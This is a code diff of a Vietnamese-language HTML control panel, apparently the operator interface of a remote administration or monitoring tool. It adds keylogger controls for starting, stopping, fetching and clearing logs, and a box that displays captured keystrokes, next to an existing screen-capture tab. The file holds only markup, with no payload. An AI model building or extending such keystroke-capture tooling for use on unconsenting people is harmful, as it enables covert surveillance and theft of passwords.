@@ -82,7 +82,7 @@
         <div class="tab" onclick="switchTab('screen')">📸 Màn hình</div>
         <div class="tab" onclick="switchTab('keylog')">⌨️ Keylogger</div>
     </div>
-
+    
     <div class="content">
         <div class="view-panel">
             
@@ -105,6 +105,16 @@
                 <button class="btn-refresh" onclick="sendCmd('get_screen')">📸 Chụp ngay</button>
                 <div style="flex:1"></div>
                 <span style="color:#666; font-size:13px">Ảnh được nén JPEG để truyền nhanh hơn.</span>
+            </div>
+            <div id="toolbar-keylog" class="toolbar hidden">
+                <button class="btn-exec" onclick="sendCmd('keylog_start')">▶ Bắt đầu ghi</button>
+                <button class="btn-kill" onclick="sendCmd('keylog_stop')">⏹ Dừng ghi</button>
+                <button class="btn-refresh" onclick="sendCmd('keylog_get')">📥 Lấy dữ liệu</button>
+                <button class="btn-kill" style="background:#666" onclick="sendCmd('keylog_clear')">🗑 Xóa Log</button>
+            </div>
+
+            <div id="view-keylog" class="hidden scroll-area" style="padding: 15px;">
+                <textarea id="txtKeylogs" style="width: 100%; height: 95%; background: #222; color: #0f0; font-family: monospace; border: none; padding: 10px;" readonly></textarea>
             </div>
             <div id="view-screen" class="hidden scroll-area" style="text-align: center; padding: 10px; background: #333;">
                 <div id="loading-screen" style="color: white; display: none;">⏳ Đang nhận dữ liệu ảnh...</div>
